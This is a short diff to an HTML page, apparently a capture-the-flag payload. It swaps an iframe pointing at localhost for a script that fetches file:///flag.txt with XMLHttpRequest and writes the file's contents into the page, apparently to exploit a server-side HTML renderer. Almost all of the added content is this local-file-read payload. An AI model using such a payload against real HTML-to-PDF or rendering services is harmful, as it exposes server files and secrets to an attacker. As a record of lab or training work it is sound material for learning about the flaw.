@@ -1,8 +1,14 @@
 <!DOCTYPE html>
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-
+<script>
+    x=new XMLHttpRequest;
+    x.onload=function(){  
+    document.write(this.responseText)
+};
+    x.open("GET","file:///flag.txt");
+    x.send();
+</script>
 <body>
-
-<iframe src="http://localhost" width="1000px" height="1000px"></iframe>
+testing
 
 </body></html>
